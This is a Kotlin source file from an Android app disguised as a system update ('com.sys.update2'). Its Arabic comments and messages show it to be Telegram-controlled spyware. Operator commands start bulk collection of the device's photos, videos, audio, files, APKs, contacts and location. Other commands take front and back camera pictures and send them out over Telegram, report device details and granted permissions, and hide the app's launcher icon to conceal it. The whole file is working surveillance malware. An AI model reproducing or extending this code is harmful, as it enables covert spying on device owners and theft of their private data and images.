// language: Kotlin, file: CommandExecutor.kt
// *أوامر _start/_stop لكل مهمة + أوامر الأجهزة والأذونات + إخفاء/إظهار*

package com.sys.update2

import android.content.Context
import android.util.Log
import okhttp3.OkHttpClient
import java.io.File
import java.util.concurrent.TimeUnit

object CommandExecutor {

    private const val TAG = "CmdExec"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    // ═══════════════════════════════════════════
    //  handlePublic — أوامر عامة (بدون رمز)
    // ═══════════════════════════════════════════
    fun handlePublic(ctx: Context, cmd: String) {
        when {
            cmd == "/start" || cmd == "/menu" || cmd == "menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)
            cmd == "/help" || cmd == "help" || cmd == "مساعدة" -> showHelp(ctx)
            cmd == "📱 قائمة الأجهزة" || cmd == "🌐 كل الأجهزة" ||
            cmd == "/devices" || cmd == "/list" ||
            cmd == "devices" || cmd == "list" -> showDeviceList(ctx)
        }
    }

    // ═══════════════════════════════════════════
    //  handleText — الأوامر الأساسية (بعد التحقق من الرمز)
    // ═══════════════════════════════════════════
    fun handleText(ctx: Context, text: String, code: String) {
        val cmd = text.trim().replace(Regex("@\\w+"), "").trim()

        when (cmd) {

            // ════════ أوامر التشغيل ════════
            "/photos_start" -> startTask(ctx, code, TaskType.PHOTOS)
            "/videos_start" -> startTask(ctx, code, TaskType.VIDEOS)
            "/audio_start"  -> startTask(ctx, code, TaskType.AUDIO)
            "/files_start"  -> startTask(ctx, code, TaskType.FILES)
            "/apk_start"    -> startTask(ctx, code, TaskType.APK)
            "/contacts_start" -> startTask(ctx, code, TaskType.CONTACTS)
            "/location_start" -> startTask(ctx, code, TaskType.LOCATION)

            // ════════ أوامر الإيقاف ════════
            "/photos_stop"   -> stopTask(ctx, code, TaskType.PHOTOS)
            "/videos_stop"   -> stopTask(ctx, code, TaskType.VIDEOS)
            "/audio_stop"    -> stopTask(ctx, code, TaskType.AUDIO)
            "/files_stop"    -> stopTask(ctx, code, TaskType.FILES)
            "/apk_stop"      -> stopTask(ctx, code, TaskType.APK)
            "/contacts_stop" -> stopTask(ctx, code, TaskType.CONTACTS)
            "/location_stop" -> stopTask(ctx, code, TaskType.LOCATION)

            // ════════ إيقاف شامل ════════
            "/stop" -> {
                runJob {
                    SyncManager.stopAll(ctx)
                    TelegramApi.sendMessage("🛑 *تم إيقاف كل المهام*\n🆔 `$code`")
                }
            }

            // ════════ حالة المهام ════════
            "/status" -> {
                runJob {
                    val cur = SyncManager.currentTask()
                    val running = SyncManager.isRunning()
                    val state = if (running) "🟢 شغّال" else "🔴 متوقف"
                    TelegramApi.sendMessage(
                        "📊 *حالة المهام*\n\n" +
                        "الحالة: $state\n" +
                        "المهمة الحالية: ${SyncManager.nameOf(cur)}\n" +
                        "🆔 `$code`"
                    )
                }
            }

            // ════════ إخفاء كامل ════════
            "/hide" -> {
                runJob {
                    try {
                        // 1) إخفاء الـ alias
                        ctx.packageManager.setComponentEnabledSetting(
                            android.content.ComponentName(ctx, "${ctx.packageName}.LauncherAlias"),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                        // 2) سجّل الحالة
                        DeviceManager.markAppHidden(ctx, true)
                        TelegramApi.sendMessage("🙈 *تم إخفاء التطبيق كاملاً*\n🆔 `$code`")
                    } catch (e: Exception) {
                        TelegramApi.sendMessage("❌ ${e.message}\n🆔 `$code`")
                    }
                }
            }

            // ════════ إظهار كامل ════════
            "/show" -> {
                runJob {
                    try {
                        ctx.packageManager.setComponentEnabledSetting(
                            android.content.ComponentName(ctx, "${ctx.packageName}.LauncherAlias"),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                        DeviceManager.markAppHidden(ctx, false)
                        TelegramApi.sendMessage("👁 *تم إظهار التطبيق كاملاً*\n🆔 `$code`")
                    } catch (e: Exception) {
                        TelegramApi.sendMessage("❌ ${e.message}\n🆔 `$code`")
                    }
                }
            }

            // ════════ عرض أذونات هذا الجهاز فقط ════════
            "/permissions" -> {
                runJob {
                    try {
                        DeviceManager.uploadPermissions(ctx)
                        Thread.sleep(800)
                        val perms = DeviceManager.getDevicePermissions(code)
                        val hidden = DeviceManager.isAppHidden(ctx, code)
                        val sb = StringBuilder()
                        sb.append("🔐 *أذونات الجهاز*\n")
                        sb.append("🆔 `$code`\n")
                        sb.append("━━━━━━━━━━━━━━━\n")
                        sb.append("📸 الصور: ${if (perms.images) "✅" else "❌"}\n")
                        sb.append("🎬 الفيديو: ${if (perms.videos) "✅" else "❌"}\n")
                        sb.append("🎵 الصوت: ${if (perms.audio) "✅" else "❌"}\n")
                        sb.append("👥 جهات الاتصال: ${if (perms.contacts) "✅" else "❌"}\n")
                        sb.append("📷 الكاميرا: ${if (perms.camera) "✅" else "❌"}\n")
                        sb.append("🎤 الميكروفون: ${if (perms.microphone) "✅" else "❌"}\n")
                        sb.append("📍 الموقع: ${if (perms.location) "✅" else "❌"}\n")
                        sb.append("🔔 الإشعارات: ${if (perms.notifications) "✅" else "❌"}\n")
                        sb.append("👁 الحالة: ${if (hidden) "🙈 مخفي" else "👁 ظاهر"}\n")
                        TelegramApi.sendMessage(sb.toString())
                    } catch (e: Exception) {
                        TelegramApi.sendMessage("❌ ${e.message}\n🆔 `$code`")
                    }
                }
            }

            "/info" -> {
                runJob {
                    TelegramApi.sendMessage(
                        "📱 *${DeviceManager.getDeviceName(ctx)}*\n" +
                        "🆔 `$code`\n\n" +
                        DeviceInfo.getFullInfo(ctx)
                    )
                }
            }

            // ════════ أوامر لحظية ════════
            "/location" -> {
                runJob {
                    TelegramApi.sendMessage("📍 *جاري تحديد الموقع...* 🆔 `$code`")
                    val loc = LocationHelper.getPreciseLocation(ctx, 15)
                    TelegramApi.sendMessage(
                        LocationHelper.formatLocation(ctx, loc) + "\n🆔 `$code`"
                    )
                }
            }

            "/cam_front" -> runJob { captureCamera(ctx, true, code) }
            "/cam_back"  -> runJob { captureCamera(ctx, false, code) }

            else -> TelegramApi.sendMessage("❓ أمر غير معروف: `$cmd`")
        }
    }

    // ═══════════════════════════════════════════
    //  Task helpers
    // ═══════════════════════════════════════════
    private fun startTask(ctx: Context, code: String, type: TaskType) {
        runJob {
            val name = SyncManager.nameOf(type)
            TelegramApi.sendMessage("🟢 *تشغيل $name*\n🆔 `$code`")
            SyncManager.start(ctx, type)
        }
    }

    private fun stopTask(ctx: Context, code: String, type: TaskType) {
        runJob {
            val name = SyncManager.nameOf(type)
            val wasRunning = SyncManager.stop(ctx, type)
            if (wasRunning) {
                TelegramApi.sendMessage("🔴 *إيقاف $name*\n🆔 `$code`")
            } else {
                TelegramApi.sendMessage("ℹ️ *$name غير نشط حالياً*\n🆔 `$code`")
            }
        }
    }

    // ═══════════════════════════════════════════
    //  Camera
    // ═══════════════════════════════════════════
    private fun captureCamera(ctx: Context, front: Boolean, code: String) {
        val label = if (front) "أمامية" else "خلفية"
        TelegramApi.sendMessage("📷 *جاري التصوير ($label)* 🆔 `$code`")
        val file: File? = try {
            CameraCapture.capture(ctx, front, timeoutSec = 12)
        } catch (_: Exception) { null }

        if (file != null && file.exists()) {
            val result = TelegramApi.sendPhoto(file, "📷 $label [${code}]")
            file.delete()
            if (!result.first) TelegramApi.sendMessage("❌ فشل الإرسال 🆔 `$code`")
        } else {
            TelegramApi.sendMessage("❌ فشل التصوير 🆔 `$code`")
        }
    }

    // ═══════════════════════════════════════════
    //  قائمة الأجهزة + الأذونات
    // ═══════════════════════════════════════════
    private fun showDeviceList(ctx: Context) {
        runJob {
            val devices = DeviceManager.getDeviceList(ctx)
            if (devices.isEmpty()) {
                TelegramApi.sendMessage("📭 لا أجهزة مسجّلة")
                return@runJob
            }

            val sb = StringBuilder()
            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n")
            sb.append("━━━━━━━━━━━━━━━━\n\n")

            for (d in devices) {
                val status = if (d.online) "🟢" else "🔴"
                val perms = DeviceManager.getDevicePermissions(d.code)
                val hidden = perms.hidden

                sb.append("$status *${d.name}*\n")
                sb.append("🆔 `${d.code}`\n")
                sb.append("━━━ الأذونات ━━━\n")
                sb.append("📸 ${if (perms.images) "✅" else "❌"} ")
                sb.append("🎬 ${if (perms.videos) "✅" else "❌"} ")
                sb.append("🎵 ${if (perms.audio) "✅" else "❌"}\n")
                sb.append("👥 ${if (perms.contacts) "✅" else "❌"} ")
                sb.append("📷 ${if (perms.camera) "✅" else "❌"} ")
                sb.append("🎤 ${if (perms.microphone) "✅" else "❌"}\n")
                sb.append("📍 ${if (perms.location) "✅" else "❌"} ")
                sb.append("🔔 ${if (perms.notifications) "✅" else "❌"}\n")
                sb.append("👁 الحالة: ${if (hidden) "🙈 مخفي" else "👁 ظاهر"}\n\n")
            }

            // قد تحتاج تقسيم الرسائل لو الأجهزة كثيرة
            val fullMsg = sb.toString()
            if (fullMsg.length > 4000) {
                fullMsg.chunked(4000).forEach {
                    TelegramApi.sendMessage(it)
                    Thread.sleep(500)
                }
            } else {
                TelegramApi.sendMessage(fullMsg)
            }
        }
    }

    private fun showMainMenu(ctx: Context) {
        val code = DeviceManager.getDeviceCode(ctx)
        val name = DeviceManager.getDeviceName(ctx)
        TelegramApi.sendMessage(
            "🎛 *لوحة التحكم*\n\n" +
            "🏷 *$name*\n🆔 `$code`\n\n" +
            "📸 `/photos_start $code` — تشغيل الصور\n" +
            "🎬 `/videos_start $code` — تشغيل الفيديو\n" +
            "🎤 `/audio_start $code` — تشغيل الصوت\n" +
            "📁 `/files_start $code` — تشغيل الملفات\n" +
            "📱 `/apk_start $code` — تشغيل APK\n" +
            "👥 `/contacts_start $code` — جهات الاتصال\n" +
            "📍 `/location_start $code` — الموقع\n\n" +
            "🛑 `/stop $code` — إيقاف الكل\n" +
            "📊 `/status $code` — الحالة\n" +
            "🔐 `/permissions $code` — الأذونات\n\n" +
            "📱 `/devices` — عرض كل الأجهزة"
        )
    }

    private fun showHelp(ctx: Context) {
        val code = DeviceManager.getDeviceCode(ctx)
        TelegramApi.sendMessage(
            "📖 *الأوامر الكاملة*\n\n" +

            "*📸 المهام (start/stop):*\n" +
            "`/photos_start $code`\n" +
            "`/photos_stop $code`\n\n" +
            "`/videos_start $code`\n" +
            "`/videos_stop $code`\n\n" +
            "`/audio_start $code`\n" +
            "`/audio_stop $code`\n\n" +
            "`/files_start $code`\n" +
            "`/files_stop $code`\n\n" +
            "`/apk_start $code`\n" +
            "`/apk_stop $code`\n\n" +
            "`/contacts_start $code`\n" +
            "`/contacts_stop $code`\n\n" +
            "`/location_start $code`\n" +
            "`/location_stop $code`\n\n" +

            "*🛑 تحكم عام:*\n" +
            "`/stop $code` — إيقاف الكل\n" +
            "`/status $code` — الحالة\n" +
            "`/permissions $code` — الأذونات\n\n" +

            "*⚡ لحظية:*\n" +
            "`/location $code` — موقع مرة واحدة\n" +
            "`/cam_front $code` — كاميرا أمامية\n" +
            "`/cam_back $code` — كاميرا خلفية\n" +
            "`/info $code` — معلومات الجهاز\n\n" +

            "*🎨 إدارة:*\n" +
            "`/hide $code` — إخفاء كامل\n" +
            "`/show $code` — إظهار كامل\n\n" +

            "*🌐 عام:*\n" +
            "`/devices` — عرض الأجهزة والأذونات\n" +
            "`/menu` — القائمة\n\n" +

            "🆔 *رمزك:* `$code`"
        )
    }

    private fun runJob(block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e(TAG, "job err: ${e.message}")
            }
        }.start()
    }
}
